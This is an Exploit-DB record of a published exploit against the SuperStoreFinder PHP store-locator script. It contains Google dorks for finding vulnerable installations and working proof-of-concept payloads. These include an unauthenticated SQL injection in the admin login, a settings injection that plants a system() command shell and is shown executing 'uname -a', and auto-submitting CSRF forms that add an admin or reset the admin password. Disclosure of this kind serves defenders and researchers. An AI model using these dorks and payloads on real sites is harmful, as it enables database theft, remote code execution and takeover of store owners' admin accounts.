{"source": "https://www.exploit-db.com/exploits/51822", "vulnName": "SuperStoreFinder - Multiple Vulnerabilities", "vulnEDBID": "51822", "vulnCVE": "N/A", "author": "BRPSD", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-27", "vulnContent": "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n .:. Exploit Title > SuperStoreFinder - Multiple Vulnerabilities\n\n.:. Google Dorks .:.\n\"designed and built by Joe Iz.\"\n\"Super Store Finder is designed and built by Joe Iz from Highwarden Huntsman.\"\ninurl:/superstorefinder/index.php\n\n.:. Date: 0ctober 13, 2023\n.:. Exploit Author: bRpsd\n.:. Contact: cy[at]live.no\n.:. Vendor -> https://www.superstorefinder.net/\n.:. Product -> https://codecanyon.net/item/super-store-finder/3630922\n.:. Product Version -> [3.7 and below]\n.:. DBMS -> MySQL\n.:. Tested on > macOS [*nix Darwin Kernel], on local xampp\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n\n\n #############\n |DESCRIPTION|\n #############\n\"Super Store Finder is a multi-language fully featured PHP/Javascript/MySQL store locator script integrated with the latest Google Maps API that allows customers to locate your stores easily. Packed with great features such as Geo Location, Drag and Drop Marker, Bulk Import and Geo code, Google Street View, Google Maps Direction and it is customizable and stylable (with extensible themes/add-ons, custom colors and maps design using snazzymaps.com). The store finder will be able to list nearby stores / outlets around your web visitors from nearest to the furthest distance away. Your customers will never be lost again getting to your stores / locations\"\n\n\n\n\n\n\nVulnerability 1: Unauthenticated SQL Injection\nTypes: boolean-based blind,error-based, time-based blind\nFile: localhost/admin/index.php\nVul Parameter: USERNAME [POST]\n\n===========================================================================================\nVulnerability 1: Unauthenticated SQL Injection\nTypes: boolean-based blind,error-based, time-based blind\nFile: localhost/admin/index.php\nVul Parameter: USERNAME [POST]\n\n\n\nTest #1\n\nhttp://localhost:9000/adminstorefinder/admin/index.php\n\nusername=a'&password=1&btn_login=Login\n\nResponse Error:\nArray\n(\n    [0] => Invalid query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin''' at line 1\n)\nSELECT users.* FROM users WHERE users.username='admin''\n===========================================================================================\n\nTest #2 => Payload (Proof Of Concept)\n\nhttp://localhost:9000/adminstorefinder/admin/index.php\n\nusername=a' AND GTID_SUBSET(CONCAT(0x7162766b71,(SELECT (CASE WHEN (ISNULL(JSON_STORAGE_FREE(NULL))) THEN 1 ELSE 0 END)),0x7170707071),3239)-- Seaj\n&password=1&btn_login=Login\n\n\nResponse Error:\nArray\n(\n    [0] => Invalid query: FUNCTION adminstorefinder.JSON_STORAGE_FREE does not exist\n)\n===========================================================================================\n\n\n\n======================================================================================================================================================================================\nVulnerability 2: Authenticated PHP Injection - Remote Code Exectuion\nFile: localhost/admin/settings.php\nVul Parameter: language_set [POST]\n\n\nProof of concept:\nhttp://localhost:9000/superstorefinder/admin/settings.php\nlangset=en_US&language_set=en_US');!isset($_GET['cmd'])?:system($_GET['cmd']);//&distance_set=mi&init_zoom=0&zoomhere_zoom=0&geo_settings=0&default_location=New York, US&style_map_color=rgba(0,0,0,1)&style_map_code=94102&style_top_bar_bg=rgba(0,0,0,1)&style_top_bar_font=rgba(0,0,0,1)&style_top_bar_border=rgba(0,0,0,1)&style_results_bg=rgba(0,0,0,1)&style_results_hl_bg=rgba(0,0,0,1)&style_results_hover_bg=rgba(0,0,0,1)&style_results_font=rgba(0,0,0,1)&style_results_distance_font=rgba(0,0,0,1)&style_distance_toggle_bg=rgba(0,0,0,1)&style_contact_button_bg=rgba(0,0,0,1)&style_contact_button_font=rgba(0,0,0,1)&style_button_bg=rgba(0,0,0,1)&style_button_font=rgba(0,0,0,1)&style_list_number_bg=rgba(0,0,0,1)&style_list_number_font=rgba(0,0,0,1)&save=1\n\n\nIndex.php included in the config.inc.php , we just can go for rce\nwith GET parameter ?cmd=\n\n\nhttp://localhost:9000/?cmd=uname -a\n\nReponse:\n22.2.0 Darwin Kernel Version 22.2.0: Fri Nov 11 02:08:47 PST 2022; root:xnu-8792.61.2~4/RELEASE_X86_64 x86_64\n===========================================================================================\n\n\n\n\n===========================================================================================\nVulnerability 3: Cross Site Request Forgery\nRisk: It can lead to Privilege Escalation through adding admins or changing admin password.\nAffected Files (1): localhost/superstorefinder/admin/users_add.php\nParameters: username,password,cpassword\n\nProof of concept:\n<iframe style=\"display:none\" name=\"CSRF\"></iframe>\n    <form method='POST' action='http://localhost:9000/superstorefinder/admin/users_add.php' target=\"CSRF\" id=\"CSRF\">\n      <input name=\"submit_hidden\" value=\"submit_hidden\" type=\"hidden\" />\n      <input type='hidden' name='username' value='X'>\n\u2002\u2002\u2002\u2002\u2002\u2002  <input type='hidden' name='password' value='123'>\n      <input type='hidden' name='cpassword' value='123'>\n      <input type='hidden' value='submit'>\n    </form>\n    <script>document.getElementById(\"CSRF\").submit()</script>\n\u2002\u2002\u2002\u2002\u2002\u2002<iframe src='http://localhost:9000/superstorefinder/admin/logout.php' width='0' height='0'></iframe>\n\n\n\n\nAffected Files (2:):localhost/superstorefinder/admin/change_password.php\nParameters: password,cpassword,save\n\nProof of concept:\n<iframe style=\"display:none\" name=\"CSRF\"></iframe>\n    <form method='POST' action='http://localhost:9000/superstorefinder/admin/users_add.php' target=\"CSRF\" id=\"CSRF\">\n      <input type='hidden' name='password' value='123'>\n\u2002\u2002\u2002\u2002\u2002\u2002  <input type='hidden' name='cpassword' value='123'>\n      <input type='hidden' name=\"save=\" value='save'>\n    </form>\n    <script>document.getElementById(\"CSRF\").submit()</script>\n\u2002\u2002\u2002\u2002\u2002\u2002<iframe src='http://localhost:9000/superstorefinder/admin/logout.php' width='0' height='0'></iframe>\n    ======================================================================================\n            "}